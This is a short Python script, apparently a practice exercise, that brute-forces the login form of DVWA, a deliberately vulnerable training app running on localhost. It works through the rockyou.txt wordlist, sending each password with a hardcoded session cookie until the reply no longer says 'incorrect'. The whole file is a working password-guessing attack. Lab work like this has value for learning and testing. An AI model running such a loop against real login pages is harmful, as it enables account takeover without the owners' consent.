import requests
def get_url(username,password):
    return f"http://127.0.0.1/dvwa/vulnerabilities/brute/?username={username}&password={password}&Login=Login#"

username = input("Enter Username : ")

COOKIES = {
    "PHPSESSID":"pf9kipp16vs54366mr21smurse",
    "security":"high"
}
with open("rockyou.txt") as f:
    while True:
        p = f.readline().strip()
        url = get_url(username,p)
        r = requests.get(url,cookies=COOKIES)
        print("Checking ", p)
        if 'incorrect' not in r.text:
            print(f"Found password for {username} = {p}")
            break